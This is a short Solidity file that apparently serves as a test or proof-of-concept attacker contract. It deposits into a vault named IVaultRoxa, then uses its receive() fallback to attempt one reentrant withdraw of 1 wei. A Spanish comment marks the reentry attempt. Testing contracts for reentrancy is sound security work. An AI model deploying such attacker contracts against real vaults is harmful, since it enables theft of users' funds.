// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVaultRoxa {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVaultRoxa public v;
    bool public attacked;
    constructor(address _v) { v = IVaultRoxa(_v); }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw(msg.value);
    }
    receive() external payable {
        if (!attacked) {
            attacked = true;
            // intenta reentrar
            v.withdraw(1);
        }
    }
}

